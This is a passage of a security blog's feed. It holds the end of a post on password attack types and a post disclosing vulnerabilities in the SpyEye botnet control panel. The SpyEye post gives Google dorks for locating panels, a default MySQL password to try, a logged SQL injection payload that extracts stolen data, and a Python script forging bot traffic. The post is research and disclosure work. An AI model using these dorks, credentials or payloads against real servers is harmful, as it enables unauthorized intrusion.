They can use your account in Facebook votes. Your e-mail, cloud storage is again very important. 20 years ago you also had letters you didn't want to print and put in front of the nearest store, neither want you to do that with your private photo album. On a side note, it is best to use a cloud storage where even the &lt;a href=&quot;https://tresorit.com/&quot; target=&quot;_blank&quot;&gt;cloud provider admin can't access your data.&lt;/a&gt; But in this case, with no password recovery option, better think about &quot;alternative&quot; password recovery mechanisms.

&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Other important stuff with personal data (e.g. your name, home address)&lt;/h3&gt;
&lt;div&gt;The &quot;medium level password&quot; class. This is a personal preference to have this class or not, but in the long run, I believe it is not a waste of energy to protect these accounts. These sites include your favorite pizza delivery service, your local PC store, etc.

&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Not important stuff&lt;/h3&gt;
&lt;p&gt;This is the category other. I usually use &lt;a href=&quot;https://www.google.com/?q=one+time+disposable+email+service#q=one+time+disposable+email+service&quot; target=&quot;_blank&quot;&gt;one-time disposable e-mail&lt;/a&gt; to these services. Used for the registration, get what I want, drop the email account. Because I don’t want to spread my e-mail address all over the internet, whenever one of these sites get hacked. But still, I prefer to use different, random passwords on these sites, although this is the “low level password” class.&lt;/p&gt;
&lt;h2&gt;&lt;/h2&gt;
&lt;h2&gt;Attackers and attack methods&lt;/h2&gt;
&lt;p&gt;After categorizing the different passwords to be protected, let’s look at the different attackers and attack methods. They can/will/or actively doing it now:&lt;/p&gt;

&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Attacking the clear text password &lt;/h3&gt;
&lt;p&gt;This is the most effective way of getting the password. Bad news is that if there is no other factor of protection, the victim is definitely not on the winning side. The different attack methods are:&lt;/p&gt;

&lt;ul&gt;&lt;li&gt;phishing sites/applications,&lt;/li&gt;&lt;/ul&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/World-of-Tanks-Hack-5.0.jpg&quot; src=&quot;https://z6543.github.io/_img/World-of-Tanks-Hack-5.0.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/World-of-Tanks-Hack-5.0.jpg&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://beta.gadgetzz.com/2011/08/15/this-is-the-best-ever-how-a-13-year-old-tried-to-hack-a-steam-account-and-got-hacked/&quot; target=&quot;_blank&quot;&gt;social engineering,&lt;/a&gt;&lt;/li&gt;&lt;li&gt;malware running on the computer (or &lt;a href=&quot;http://www.computerworld.com/article/2492866/desktop-apps/researcher-to-demonstrate-feature-rich-malware-that-works-as-a-browser-extension.html&quot; target=&quot;_blank&quot;&gt;in the browser&lt;/a&gt;), &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=t9BxB3dO0KQ&quot; target=&quot;_blank&quot;&gt;shoulder surfing&lt;/a&gt; (check out for smartphones, hidden cameras), &lt;/li&gt;&lt;li&gt;sniffing clear-text passwords when the website is not protected with SSL,&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.hacking-tutorial.com/hacking-tutorial/break-ssl-protection-using-sslstrip-and-backtrack-5/&quot; target=&quot;_blank&quot;&gt;SSL MiTM&lt;/a&gt;,&lt;/li&gt;&lt;li&gt;rogue website administrator/hacker logging clear text passwords,&lt;/li&gt;&lt;li&gt;password reuse - if the attacker can get your password in any way, and you reuse it somewhere else, that is a problem,&lt;/li&gt;&lt;li&gt;you told your password to someone and he/she will misuse it later,&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.keyghost.com/USB-Keylogger.htm&quot; target=&quot;_blank&quot;&gt;hardware keyloggers,&lt;/a&gt;&lt;/li&gt;&lt;li&gt;etc.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;The key thing here is that no matter how long your passwords are, no matter how complex it is, no matter how often do you change it (except when you do this every minute … ), if it is stolen, you are screwed. 2FA might save you, or might not.&lt;/p&gt;

&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Attacking the encrypted password &lt;/h3&gt;
&lt;p&gt;This is the usual “hack the webserver (via SQL injection), dump the passwords (with SQLMap), post hashes on pastebin, everybody &lt;a href=&quot;http://www.networkworld.com/article/2172637/lan-wan/nvidia-exploit-could-turn-render-farms-into-password-crackers--bitcoin-miners--researchers-c.html&quot; target=&quot;_blank&quot;&gt;starts the GPU farm&lt;/a&gt; to crack the hashes” scenario. This is basically the only scenario where the password policies makes sense. In this case the different level of passwords need different protection levels. In some cases, this attack turns out to be the same as the previous attack, when the passwords are not hashed, or are just encoded.&lt;/p&gt;

&lt;p&gt;The current hash cracking speeds for hashes without any iterations (this is unfortunately very common) renders passwords like Q@tCB3nx (8 character, upper-lowercase, digit, special characters) useless, as those can be cracked in hours. Don’t believe me? Let’s do the math.&lt;/p&gt;

&lt;p&gt;Let’s say your password is truly random, and randomly choosen from the 26 upper, 26 lower, 10 digit, 33 special characters. (Once I tried special passwords with high ANSI characters inside. It is a terrible idea. Believe me.). There are 6 634 204 312 890 620 different, 8 character passwords from these characters. Assuming a &lt;a href=&quot;http://passwords12.at.ifi.uio.no/Jeremi_Gosney_Password_Cracking_HPC_Passwords12.pdf&quot; target=&quot;_blank&quot;&gt;2 years-old password cracking rig&lt;/a&gt;, and MD5 hash cracking with 180 G/s speed, it takes a worst case 10 hours (average 5) to crack the password, &lt;strike&gt;including upgrading your bash to the latest, but still vulnerable bash version.&lt;/strike&gt; Had the password been 10 characters long, it would take 10 years to crack with today hardware. But if the password is not truly random, &lt;a href=&quot;http://arstechnica.com/security/2013/05/how-crackers-make-minced-meat-out-of-your-passwords/&quot; target=&quot;_blank&quot;&gt;it can be cracked a lot sooner&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;A lot of common hashing algorithms don’t use protections against offline brute-force attacks. This includes LM (old Windows hashes), NTLM (modern Windows hashes), MD-5, SHA1-2-512. These hashing algorithms were not developed for password hashing. They don’t have salting, iterations, etc. out of the box. In the case of LM, the problem is even worse, as it converts the lowercase characters to uppercase ones, thus radically decreasing the key space. Out of the box, these hashes are made for fast calculation, thus support fast brute-force.&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/rig.png&quot; src=&quot;https://z6543.github.io/_img/rig.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/rig.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;Another attack is when the protected thing is not an online service, but rather an encrypted file or crypto-currency wallet.&lt;/p&gt;

&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Attacking the authentication system online&lt;/h3&gt;
&lt;div&gt;This is what happened in the recent iCloud hack (besides phishing). Attackers were attacking the authentication system, by either brute-forcing the password, or bypassing the password security by answering the security question. Good passwords can not be brute-forced, as it takes ages. Good security answers have nothing to do with the question in first place. A good security answer is as hard to guess as the password itself. If password recovery requires manual phone calls, I know, it is a bit awkward to say that your first dog name was Xjg.2m`4cJw:V2= , but on the other hand, no one will guess that!

&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sec_questions.png&quot; src=&quot;https://z6543.github.io/_img/sec_questions.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sec_questions.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;div&gt;&lt;h3&gt;&lt;/h3&gt;&lt;h3&gt;Attacking single sign on&lt;/h3&gt;&lt;/div&gt;
&lt;div&gt;This type of attack is a bit different, as I was not able to put the &quot;&lt;a href=&quot;http://en.wikipedia.org/wiki/Pass_the_hash&quot; target=&quot;_blank&quot;&gt;pass the hash&lt;/a&gt;&quot; attacks anywhere. Pass the hash attack is usually found in Windows domain environments, but others might be affected as well. The key thing is single sign on. If you can login to one system (e.g. your workstation), and access many different network resources (file share, printer, web proxy, e-mail, etc.) without providing any password, then something (a secret) has to be in the memory which can be used to to authenticate to the services. If an attacker can access this secret, he will be able to access all these services. The key thing is (again) it does not matter, how complex your passwords are, how long it is, how often do you change, as someone can easily misuse that secret.

&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/passthehash.jpg&quot; src=&quot;https://z6543.github.io/_img/passthehash.jpg&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/passthehash.jpg&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt; &lt;/h3&gt;
&lt;h3&gt;Attacking 2FA&lt;/h3&gt;
&lt;div&gt;As already stated, 2 factor authentication raises the efforts from an attacker point of view, but does not provide 100% protection. &lt;/div&gt;
&lt;div&gt;&lt;ul&gt;&lt;li&gt;one time tokens (SecurID, Yubikey) can be relayed in a &lt;a href=&quot;https://www.youtube.com/watch?v=Bf2nYkn32DM&quot; target=&quot;_blank&quot;&gt;man-in-the-middle attack&lt;/a&gt;, &lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.computerworld.com/article/2493077/malware-vulnerabilities/proof-of-concept-malware-can-share-usb-smart-card-readers-with-attackers-ove.html&quot; target=&quot;_blank&quot;&gt;smartcard authentication can be relayed&lt;/a&gt; with the help of a malware to the attacker machine - or simply circumvented in the browser malware, &lt;/li&gt;&lt;li&gt;text based (SMS) messages can be stolen by &lt;a href=&quot;http://www.kaspersky.com/about/news/virus/2011/Teamwork_How_the_ZitMo_Trojan_Bypasses_Online_Banking_Security&quot; target=&quot;_blank&quot;&gt;malware&lt;/a&gt; on the smartphone or rerouted via SS7, &lt;/li&gt;&lt;li&gt;bio-metric protection is constantly &lt;a href=&quot;http://www.ccc.de/en/updates/2013/ccc-breaks-apple-touchid&quot; target=&quot;_blank&quot;&gt;bypassed&lt;/a&gt;,&lt;/li&gt;&lt;li&gt;SSH keys are constantly &lt;a href=&quot;https://www.venafi.com/blog/post/i-hunt-sys-admins-ssh&quot; target=&quot;_blank&quot;&gt;stolen&lt;/a&gt;,&lt;/li&gt;&lt;li&gt;but U2F keys are pretty good actually, even though BGP/DNS hijack or similar MiTM can still circumvent that protection,&lt;/li&gt;&lt;li&gt;etc. &lt;/li&gt;&lt;/ul&gt;&lt;div&gt;
&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/asps1.png&quot; src=&quot;https://z6543.github.io/_img/asps1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/asps1.png&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;h3&gt;&lt;/h3&gt;
&lt;h3&gt;Others&lt;/h3&gt;
&lt;p&gt;Beware that there are tons of other attack methods to access your online account (like XSS/CSRF), but all of these have to be handled on the webserver side. The best you can do is to choose a website where the Bug Bounty program is running 24/7. Otherwise, the website may be full of low hanging, easy-to-hack bugs.&lt;/p&gt;

&lt;p&gt;Now that we have covered what we want to protect against what, in the &lt;a href=&quot;http://jumpespjump.blogspot.com/2014/10/change-passwords-regularly-myth-and-lie_13.html&quot; target=&quot;_blank&quot;&gt;next blog post&lt;/a&gt;, you will see how to do that. Stay tuned. I will also explain the title of this blog post.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Attacking financial malware botnet panels - SpyEye</title>
   <link href="https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/spyeye/sql/injection/sqli/2014/08/22/Attacking-financial-malware-botnet-panels-SpyEye.html"/>
   <updated>2014-08-22T13:53:28+00:00</updated>
   <id>https://httpscolonforwardslashforwardslashwwwdotzoltanbalazsdotcom.com/botnet/spyeye/sql/injection/sqli/2014/08/22/Attacking-financial-malware-botnet-panels---SpyEye</id>
   <content type="html">&lt;div style=&quot;&quot;&gt;This is the second blog post in the &quot;Attacking financial malware botnet panels&quot; series. After playing with &lt;a href=&quot;http://jumpespjump.blogspot.com/2014/02/attacking-financial-malware-botnet.html&quot; target=&quot;_blank&quot;&gt;Zeus&lt;/a&gt;, my attention turned to another old (and dead) botnet, SpyEye. From an ITSEC perspective, SpyEye shares a lot of vulnerabilities with Zeus. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The following report is based on SpyEye 1.3.45, which is old, and if we are lucky, the whole SpyEye branch will be dead soon. &lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Google dorks to find SpyEye C&amp;amp;C server panel related stuff:&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;if the img directory gets indexed, it is rather easy, search for e.g. inurl:b-ftpbackconnect.png&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;if the install directory gets indexed, again, easy, search for e.g. inurl:spylogo.png&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;also, if you find a login screen, check the css file (style.css), and you see #frm_viewlogs, #frm_stat, #frm_botsmon_country, #frm_botstat, #frm_gtaskloader and stuff like that, you can be sure you found it&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;otherwise, it is the best not to Google for it, but get a SpyEye sample and analyze it&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;And this is how the control panel login looks like, nothing sophisticated:&lt;/p&gt;

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sc01.png&quot; src=&quot;https://z6543.github.io/_img/sc01.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img align=&quot;center/&quot; border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sc01.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;The best part is that you don't have to guess the admin's username ;)

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;This is how an average control panel looks like:

&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/sc02.png&quot; src=&quot;https://z6543.github.io/_img/sc02.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/sc02.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Hack the Planet! :)

&lt;/div&gt;
&lt;h3 style=&quot;text-align: justify;&quot;&gt;Boring vulns found (warning, an almost exact copy from the Zeus blog post)&lt;/h3&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Clear text HTTP login - you can sniff the login password via MiTM, or steal the session cookies&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;No password policy - admins can set up really weak passwords&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;No anti brute-force - you can try to guess the admin's password. There is no default username, as there is no username handling!&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Password autocomplete enabled - boring&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Missing HttpOnly flag on session cookie - interesting when combining with XSS&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;No CSRF protection - e.g. you can upload new exe, bin files, turn plugins on/off :-( boring. Also the file extension check can be bypassed, but the files are stored in the database, so no PHP shell this time. If you check the following code, you can see that even the file extension and type is checked, and an error is shown, but the upload process continues. And even if the error would stop the upload process, the check can be fooled by setting an invalid $uptype. Well done ...&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;&lt;pre class=&quot;prettyprint linenums lang-php&quot;&gt;        if ($_FILES['file']['tmp_name'] &amp;amp;&amp;amp; ($_FILES['file']['size'] &amp;gt; 0))
        {
                $outstr = &quot;&amp;lt;br&amp;gt;&quot;;
                set_time_limit(0);
                $filename = str_replace(&quot; &quot;,&quot;_&quot;,$_FILES['file']['name']);
                $ext = substr($filename, strrpos($filename, '.')+1);
                if( $ext==='bin' &amp;amp;&amp;amp; $uptype!=='config' ) $outstr .= &quot;&amp;lt;font class='error'&amp;gt;Bad CONFIG extension!&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;;
                if( $ext==='exe' &amp;amp;&amp;amp; $uptype!=='body' &amp;amp;&amp;amp; $uptype!=='exe' ) $outstr .= &quot;&amp;lt;font class='error'&amp;gt;Bad extension!&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&quot;;

                switch( $uptype )
                {
                case 'body': $ext = 'b'; break;
                case 'config': $ext = 'c'; break;
                case 'exe': $ext = 'e'; break;
                default: $ext = 'e';
                }
                $_SESSION['file_ext'] = $ext;
                if( isset($_POST['bots']) &amp;amp;&amp;amp; trim($_POST['bots']) !== '')
                {
                        $bots = explode(' ', trim($_POST['bots']));
                        //writelog(&quot;debug.log&quot;, trim($_POST['bots']));
                        $filename .= &quot;_&quot;.(LastFileId()+1);
                }
                if( FileExist($filename) ) $filename .= LastFileId();
                $tmpName  = $_FILES['file']['tmp_name'];
                $fileSize = $_FILES['file']['size'];
                $fileType = $_FILES['file']['type'];
                ## reading all file for calculating hash
                $fp = fopen($tmpName, 'r');
&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;Clear text password storage - the MySQL passwords are stored in php files, in clear text. Also, the login password to the form panel is stored in clear text.&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;MD5 password - the passwords stored in MySQL are MD5 passwords. No PBKDF2, bcrypt, scrypt, salt, whatever. MD5. Just look at the pure simplicity of the login check, great work!&lt;/li&gt;&lt;/ul&gt;
&lt;div style=&quot;&quot;&gt;&lt;pre class=&quot;prettyprint lang-php&quot;&gt;$query = &quot;SELECT * FROM users_t WHERE uPswd='&quot;.md5($pswd).&quot;'&quot;;&lt;/pre&gt;&lt;/div&gt;
&lt;div&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;ClickJacking - really boring stuff&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;&lt;/ul&gt;&lt;h3 style=&quot;text-align: justify;&quot;&gt;SQL injection&lt;/h3&gt;&lt;/div&gt;
&lt;div&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;SpyEye has a fancy history of SQL injections. See details &lt;a href=&quot;http://secniche.blogspot.hu/2011/08/blasting-spyeye-c-sql-injection-wins.html&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;http://hacker-post.blogspot.hu/2013/01/pwning-spyeye-12x-and-13x.html&quot;&gt;here&lt;/a&gt;, &lt;a href=&quot;http://bloz.isbox.org/2012/03/spyeye-sqlis.html&quot;&gt;here&lt;/a&gt;, video &lt;a href=&quot;https://www.youtube.com/watch?v=ou-FB9MbbPM&quot;&gt;here &lt;/a&gt;and video &lt;a href=&quot;https://www.youtube.com/watch?v=eCEK8S-9-q4&quot;&gt;here&lt;/a&gt;.

It is important to highlight the fact that most of the vulnerable functions are reachable without any authentication, because these PHP files lack user authentication at the beginning of the files.

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;But if a C&amp;amp;C server owner gets pwned through this vuln, it is not a good idea to complain to the developer, because after careful reading of the install guide, one can see:

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&quot;For searching info in the collector database there is a PHP interface as formgrabber admin panel. The admin panel is not intended to be found on the server. This is a client application.&quot;

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;And there are plenty of reasons not to install the formgrabber admin panel on any internet reachable server. But this fact leads to another possible vulnerability. The user for this control panel is allowed to remotely login to the MySQL database, and the install guide has pretty good passwords to be reused. I mean it looks pretty secure, there is no reason not to use that.

&lt;pre class=&quot;prettyprint lang-sql&quot;&gt;CREATE USER 'frmcpviewer' IDENTIFIED BY 'SgFGSADGFJSDGKFy2763272qffffHDSJ';
&lt;/pre&gt;
Next time you find a SpyEye panel, and you can connect to the MySQL database, it is worth a shot to try this password.

Unfortunately the default permissions for this user is not enough to write files (select into outfile):

&lt;pre class=&quot;prettyprint&quot;&gt;Access denied for user 'frmcpviewer' (using password: YES)&lt;/pre&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
I also made a little experiment with this SQL injection vulnerability. I did set up a live SpyEye botnet panel, created the malware install binaries (droppers), and sent the droppers to the AV companies. And after more and more sandboxes connected to my box, someone started to exploit the SQL injection vulnerability on my server!

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;&lt;pre class=&quot;prettyprint&quot;&gt;63.217.168.90 - - [16/Jun/2014:04:43:00 -0500] &quot;GET /form/frm_boa-grabber_sub.php?bot_guid=&amp;amp;lm=3&amp;amp;dt=%20where%201=2%20union%20select%20@a:=1%20from%20rep1%20where%20@a%20is%20null%20union%20select%20@a:=%20@a%20%2b1%20union%20select%20concat(id,char(1,3,3,7),bot_guid,char(1,3,3,7),process_name,char(1,3,3,7),hooked_func,char(1,3,3,7),url,char(1,3,3,7),func_data)%20from%20rep2_20140610%20where%20@a=3%23 HTTP/1.1&quot; 200 508 &quot;-&quot; &quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)&quot;&lt;/pre&gt;&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;
&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Although the query did not return any meaningful data to the attacker (only data collected from sandboxes), it raises some legal questions.

&lt;/div&gt;
&lt;div style=&quot;&quot;&gt;Which company/organization has the right to attack my server? &lt;/div&gt;
&lt;div&gt;&lt;ul&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;police (having a warrant)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;military (if we are at war)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;spy agencies (always/never, choose your favorite answer)&lt;/li&gt;&lt;li style=&quot;text-align: justify;&quot;&gt;CERT organisations?&lt;/li&gt;&lt;/ul&gt;&lt;div style=&quot;&quot;&gt;
But, does an AV company or security research company has the legal right to attack my server? I don't think so... The most problematic part is when they hack a server (without authorization), and sell the stolen information in the name of &quot;intelligence service&quot;. What is it, the wild wild west?

The SQLi clearly targets the content of the stolen login credentials. If this is not an AV company, but an attacker, how did they got the SpyEye dropper? If this is an AV company, why are they stealing the stolen credentials? Will they notify the internet banking owners about the stolen credentials for free? Or will they do this for money?

And don't get me wrong, I don't want to protect the criminals, but this is clearly a grey area in the law. From an ethical point of view, I agree with hacking the criminal's servers. As you can see, the whole post is about disclosing vulns in these botnet panels. But from a legal point of view, this is something tricky ... I'm really interested in the opinion of others, so comments are warmly welcome.

On a side note, I was interested how did the &quot;attackers&quot; found the SpyEye form directory? Easy, they brute-forced it, with a wordlist having ~43.000 entries.

&lt;h3&gt;(Useless) Cross site scripting&lt;/h3&gt;&lt;div&gt;
&lt;/div&gt;Although parts of the SpyEye panel are vulnerable to XSS, it is unlikely that you will to find these components on the server, as these codes are part of the install process, and the installer fails to run if a valid install is found. And in this case, you also need the DB password to trigger the vuln...

&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;/div&gt;&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/xss_1.png&quot; src=&quot;https://z6543.github.io/_img/xss_1.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/xss_1.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div class=&quot;separator&quot; style=&quot;&quot;&gt;&lt;a href=&quot;https://z6543.github.io/_img/xss_2.png&quot; src=&quot;https://z6543.github.io/_img/xss_2.png&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; height=&quot;&quot; src=&quot;https://z6543.github.io/_img/xss_2.png&quot; width=&quot;400&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
&lt;h3&gt;Session handling&lt;/h3&gt;&lt;div&gt;
&lt;/div&gt;This is a fun part. The logout button invalidates the session only on the server side, but not on the client side. But if you take into consideration that the login process never regenerates the session cookies (a.k.a session fixation), you can see that no matter how many times the admin logs into the application, the session cookie remains the same (until the admin does not close the browser). So if you find a session cookie which was valid in the past, but is not working at the moment, it is possible that this cookie will be valid in the future ...

&lt;h3&gt;Binary server&lt;/h3&gt;&lt;div&gt;
&lt;/div&gt;Some parts of the SpyEye server involve running a binary server component on the server, to collect the form data. It would be interesting to fuzz this component (called sec) for vulns. 

&lt;h3&gt;Log files revealed&lt;/h3&gt;&lt;div&gt;
&lt;/div&gt;If the form panel mentioned in the SQLi part is installed on the server, it is worth visiting the &amp;lt;form_dir&amp;gt;/logs/error.log file, you might see the path of the webroot folder, IP addresses of the admins, etc.

&lt;h3&gt;Reading the code&lt;/h3&gt;&lt;div&gt;
&lt;/div&gt;Sometimes reading the code you can find code snippets, which is hard to understand with a clear mind: 

&lt;pre class=&quot;prettyprint lang-php&quot;&gt;$content = fread($fp, filesize($tmpName));
if ( $uptype === 'config' )
    $md5 = GetCRC32($content);
else $md5 = md5($content);
....
&amp;lt;script&amp;gt;
if (navigator.userAgent.indexOf(&quot;Mozilla/4.0&quot;) != -1) {
        alert(&quot;Your browser is not support yet. Please, use another (FireFox, Opera, Safari)&quot;);
        document.getElementById(&quot;div_main&quot;).innerHTML = &quot;&amp;lt;font class=\'error\'&amp;gt;ChAnGE YOuR BRoWsEr! Dont use BUGGED Microsoft products!&amp;lt;/font&amp;gt;&quot;;
}
&amp;lt;/script&amp;gt;
&lt;/pre&gt;&lt;div&gt;
&lt;h3&gt;Decrypting SpyEye communication&lt;/h3&gt;&lt;/div&gt;&lt;div&gt;It turned out that the communication between the malware and C&amp;amp;C server is not very sophisticated (Zeus does a better job at it, because the RC4 key stream is generated from the botnet password).&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;&lt;div&gt;&lt;pre class=&quot;prettyprint linenums lang-php&quot;&gt;function DeCode($content)
{
        $res = '';
        for($i = 0; $i &amp;lt; strlen($content); $i++)
        {
                $num = ord($content[$i]);
                if( $num != 219) $res .= chr($num^219);
        }
        return $res;
}
&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;Fixed XOR key, again, well done ... 
&lt;div&gt;This means that it is easy to create a script, which can communicate with the SpyEye server. For example this can be used to fill in the SpyEye database with crap data.&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;div&gt;
&lt;/div&gt;&lt;pre class=&quot;prettyprint linenums lang-python&quot;&gt;import binascii
import requests
import httplib, urllib

def xor_str(a, b):
    i = 0
    xorred = ''
    for i in range(len(a)):
        xorred += chr(ord(a[i])^b)
    return xorred
            
b64_data= &quot;vK6yv+bt9er17O3r6vqPnoiPjZb2i5j6muvo6+rjmJ/9rb6p5urr6O/j/bK+5uP16/Xs7evq9ers7urv/bSo5u316vXs7evq/a6v5pq/trK1/bi4qbjm453j6uPv7Or9tr/u5um+uuvpve3p7eq/4+vsveLi7Lnqvrjr6ujs7rjt7rns/au3vOa5sre3srW8s7q2tr6p4Lm3tLiw4LmuvKm+q7Spr+C4uPu8qbq5ub6p4Li4vKm6ubm+qeC4qb6/sq+8qbq54LiuqK+0tri0tbW+uK+0qeC/v7So4L+1qLqrsuC+trqyt7ypurm5vqngvb24vqmvvKm6ubm+qeC9/aivuq/mtLW3srW+&quot;
payload =xor_str (binascii.a2b_base64(b64_data), 219) 
print (&quot;the decrypted payload is: &quot; + payload)
params = (binascii.b2a_base64(xor_str(payload,219)))
payload = {'data': params}
r = requests.post(&quot;http://spyeye.localhost/spyeye/_cg/gate.php&quot;, data=payload)
&lt;/pre&gt;&lt;div&gt;&lt;h3&gt;Morale of the story?&lt;/h3&gt;&lt;div&gt;
